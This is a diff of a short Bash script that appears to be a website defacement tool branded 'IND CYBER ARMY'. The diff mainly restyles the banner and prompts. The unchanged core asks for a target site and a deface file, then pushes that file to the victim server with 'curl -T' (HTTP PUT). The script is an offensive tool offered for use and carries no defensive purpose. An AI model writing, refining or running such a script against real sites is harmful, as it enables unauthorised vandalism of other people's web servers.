@@ -24,11 +24,8 @@ Y='\x1b[1;33m'
 C='\x1b[1;36m'
 D='\x1b[0m'
 
-figlet IND| lolcat
 
-figlet -f shadow.flf "Cyber" | lolcat
-
-figlet -f digital.flf " Army" | lolcat
+figlet -f digital.flf "IND CYBER ARMY" | lolcat
 
 echo "     =================================== $green"| lolcat 
 echo "    | Autor : Dry_Ica_Tuan-Ar $green "| lolcat
@@ -40,12 +37,12 @@ echo "     =================================== $green"| lolcat
 echo ""
 echo ""
 
-echo "  ╭─[Masukan Target]$green "| lolcat
-read -p "   ╰─Nama Web=" target;
+echo "╭─[Masukan Target]$green "| lolcat
+read -p "╰─Nama Web=" target;
 sleep 1
-echo "  ╭─[Masukan Secrip Deface] $green"| lolcat
-read -p "   ╰─Nama Secrip Deface=" file;
+echo "╭─[Masukan Secrip Deface] $green"| lolcat
+read -p "╰─Nama Secrip Deface=" file;
 sleep 1
-echo "  loading.... $green "| lolcat 
+echo "loading.... $green "| lolcat 
 sleep 1
 curl -T /storage/emulated/0/$file $target 
